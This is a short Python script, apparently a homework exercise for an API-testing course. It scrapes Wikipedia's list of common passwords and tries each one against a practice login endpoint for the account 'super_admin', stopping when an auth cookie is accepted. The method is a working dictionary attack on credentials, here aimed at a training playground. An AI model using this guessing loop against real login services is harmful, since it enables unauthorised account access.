import requests
from lxml import html

url = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
url_for_check = " https://playground.learnqa.ru/ajax/api/check_auth_cookie"
url_data_source = "https://en.wikipedia.org/wiki/List_of_the_most_common_passwords"
login = "super_admin"

response_source = requests.get(url_data_source)

tree = html.fromstring(response_source.text)

locator = '//*[contains(text(),"Top 25 most common passwords by year according to SplashData")]//..//td[@align="left"]/text()'
passwords = tree.xpath(locator)
passwords = list(dict.fromkeys(passwords))

for password in passwords:
    password = str(password).strip()
    data = {
        "login": login,
        "password": password
    }

    response_login = requests.post(url, data=data)
    assert response_login.status_code == 200, f"Wrong credentials/ Unexpected status code {response_login.status_code}"
    assert "auth_cookie" in response_login.cookies, "Cannot find cookie in response"
    auth_cookie = response_login.cookies["auth_cookie"]

    response_check = requests.get(url_for_check, cookies ={"auth_cookie": auth_cookie})
    if response_check.text == "You are authorized":
        print(password)
        break
    elif response_check.text == "You are NOT authorized":
        continue
    else:
        print(f"Something goes wrong, unexpected response text: {response_check.text}")
